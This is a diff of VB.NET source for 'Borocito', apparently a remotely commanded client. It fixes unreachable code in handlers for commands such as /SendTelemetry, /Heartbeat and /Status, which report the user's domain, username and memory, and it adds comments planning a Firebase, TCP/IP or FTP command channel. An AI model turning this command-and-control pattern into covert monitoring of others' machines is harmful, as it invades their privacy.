@@ -11,7 +11,7 @@ Module GlobalUses
     Public HttpOwnerServer As String
     Public compileVersion As String = My.Application.Info.Version.ToString &
         " (" & Application.ProductVersion & ") " &
-        "[07/06/2022 15:56]" 'Indicacion exacta de la ultima compilacion
+        "[26/11/2022 19:08]" 'Indicacion exacta de la ultima compilacion
 End Module '<--- ACTUALIZAR DATOS
 Module Utility
     Public tlmContent As String
@@ -671,11 +671,12 @@ Module Network
                 Extractor()
 
             ElseIf command.StartsWith("/SendTelemetry") Then 'Funciona.
-                Return "Sending located telemetry..."
                 AddToLog("Network", "Borocito has been called to send telemetry!", True)
                 SendTelemetry()
+                Return "Sending located telemetry..."
 
             ElseIf command.StartsWith("/Heartbeat") Then 'Funciona.
+                AddToLog("Network", "Hey, Im here!", True)
                 Return "---/\--- (Pum pum...)" &
                     vbCrLf & "[VARIABLES]" &
                     vbCrLf & compileVersion &
@@ -698,7 +699,6 @@ Module Network
                     My.Computer.Info.AvailableVirtualMemory & "/" &
                     My.Computer.Info.TotalPhysicalMemory & "/" &
                     My.Computer.Info.TotalVirtualMemory
-                AddToLog("Network", "Hey, Im here!", True)
 
             ElseIf command.StartsWith("/Status") Then 'Funciona.
                 Return My.Application.Info.AssemblyName & " v" & My.Application.Info.Version.ToString & " (" & Application.ProductVersion & "). Running in " & Environment.UserDomainName & "\" & Environment.UserName
@@ -775,4 +775,14 @@ Module Network
             AddToLog("ConfigFiles@Network", "Error: " & ex.Message, True)
         End Try
     End Sub
+End Module
+Module Boro_Comm
+    'BORO-COMM es el nuevo sistema de comunicacion Servidor-Cliente-Servidor
+    'Utiliza el (proximo) complemento Boro-Comm para realizar la tarea de comunicar con algun proveedor de comandos
+    'Como:
+    '   Firebase by Google
+    '       Realtime Database
+    '   TCP/IP (for Local network or Wordwide)
+    '   IDFTP (Actual system)
+    '   Another (Custom, developer by You or others...)
 End Module
